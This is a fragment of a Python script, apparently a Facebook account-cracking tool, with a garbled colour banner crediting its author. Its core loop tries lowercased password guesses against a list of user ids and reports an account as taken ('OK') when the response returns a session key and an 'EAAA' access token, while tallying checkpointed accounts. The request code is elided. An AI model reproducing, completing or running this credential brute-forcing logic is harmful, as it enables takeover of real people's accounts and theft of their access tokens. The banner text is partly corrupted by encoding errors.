...
\33[1;32m |__/  |__/|__/  \__/|__/  |__/ 
    ...
    鈹� [鉁揮 AUTHOR   : ARIYAN SHUVO          鈹�
    鈹� [鉁揮 GITHUB   : AKA-404         鈹�
    鈹� [鉁揮 WHATSAPP : FUCK U        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mAKA\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		print("%s [%s庐%s] %sVERSION   : %s2.7 "%(G,R,G,Y,G))
		...
		print("\033[92;1m        AUTHOR : ARIYAN-SHUVO     ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/profile.php?id=100079143742521')
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[A-K-A馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[A-K-A-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
